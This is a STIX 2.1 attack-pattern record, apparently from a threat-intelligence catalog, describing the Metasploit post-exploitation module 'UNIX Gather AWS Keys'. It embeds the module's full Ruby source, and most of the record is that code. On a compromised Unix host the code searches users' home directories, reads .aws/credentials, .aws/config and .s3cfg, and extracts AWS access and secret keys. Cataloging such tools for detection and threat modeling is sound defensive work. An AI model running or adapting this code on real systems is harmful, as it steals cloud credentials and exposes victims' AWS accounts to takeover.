{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--2d5b9aab-a154-4aaa-b30d-622c4aa82e84",
    "created": "2024-08-14T16:33:19.171447Z",
    "modified": "2024-08-14T16:33:19.171451Z",
    "name": "UNIX Gather AWS Keys",
    "description": " This module will attempt to read AWS configuration files (.aws/config, .aws//credentials and .s3cfg) for users discovered on the session'd system and extract AWS keys from within.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/multi/gather/aws_keys.rb",
            "external_id": "aws_keys.rb"
        },
        {
            "source_name": "reference",
            "url": "http://s3tools.org/kb/item14.htm"
        },
        {
            "source_name": "reference",
            "url": "http://docs.aws.amazon.com/cli/latest/userguide/cli-chap-getting-started.html#cli-config-files"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::File\n  include Msf::Post::Unix\n\n  AWS_KEY = 'AWS_ACCESS_KEY_ID'\n  AWS_SECRET = 'AWS_SECRET_ACCESS_KEY'\n  S3_KEY = 'access_key'\n  S3_SECRET = 'secret_key'\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'UNIX Gather AWS Keys',\n        'Description' => %q{\n          This module will attempt to read AWS configuration files\n          (.aws/config, .aws//credentials and .s3cfg) for users discovered\n          on the session'd system and extract AWS keys from within.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [ 'Jon Hart <jon_hart[at]rapid7.com>' ],\n        'Platform' => ['linux', 'osx', 'unix', 'solaris', 'bsd'],\n        'SessionTypes' => %w[shell meterpreter],\n        'References' => [\n          [ 'URL', 'http://s3tools.org/kb/item14.htm' ],\n          [ 'URL', 'http://docs.aws.amazon.com/cli/latest/userguide/cli-chap-getting-started.html#cli-config-files' ]\n        ]\n      )\n    )\n  end\n\n  def get_aws_keys(config_file)\n    keys_data = []\n    unless readable? config_file\n      vprint_error(\"Couldn't read #{config_file}\")\n      return []\n    end\n    config_s = read_file(config_file)\n    return keys_data if config_s.empty?\n\n    aws_config = Rex::Parser::Ini.from_s(config_s)\n    aws_config.each_key do |profile|\n      # XXX: Ini assumes anything on either side of the = is the key and value\n      # including spaces, so we need to fix this\n      profile_config = Hash[aws_config[profile].map { |k, v| [ k.strip, v.strip ] }]\n      aws_access_key_id = nil\n      aws_secret_access_key = nil\n      profile_config.each_pair do |key, value|\n        if key == AWS_KEY.downcase || key == S3_KEY\n          aws_access_key_id = value\n        end\n\n        if key == AWS_SECRET.downcase || key == S3_SECRET\n          aws_secret_access_key = value\n        end\n      end\n      next unless aws_access_key_id || aws_secret_access_key\n\n      keys_data << [ config_file, aws_access_key_id, aws_secret_access_key, profile ]\n    end\n\n    keys_data\n  end\n\n  def get_keys_from_files\n    keys_data = []\n    vprint_status('Enumerating possible user AWS config files')\n    # build up a list of aws configuration files to read, including the\n    # configuration files that may exist (rare)\n    enum_user_directories.map do |user_dir|\n      vprint_status(\"Looking for AWS config/credentials files in #{user_dir}\")\n      %w[.aws/config .aws/credentials .s3cfg].each do |possible_key_file|\n        this_key_data = get_aws_keys(::File.join(user_dir, possible_key_file))\n        next if this_key_data.empty?\n\n        keys_data <<= this_key_data.flatten\n      end\n    end\n    keys_data\n  end\n\n  def run\n    keys_data = get_keys_from_files\n    return if keys_data.empty?\n\n    keys_table = Rex::Text::Table.new(\n      'Header' => 'AWS Key Data',\n      'Columns' => [ 'Source', AWS_KEY, AWS_SECRET, 'Profile' ]\n    )\n\n    keys_data.each do |key_data|\n      keys_table << key_data\n    end\n\n    print_line(keys_table.to_s)\n  end\nend\n",
    "x_mitre_platforms": [
        "['linux', 'osx', 'unix', 'solaris', 'bsd']"
    ]
}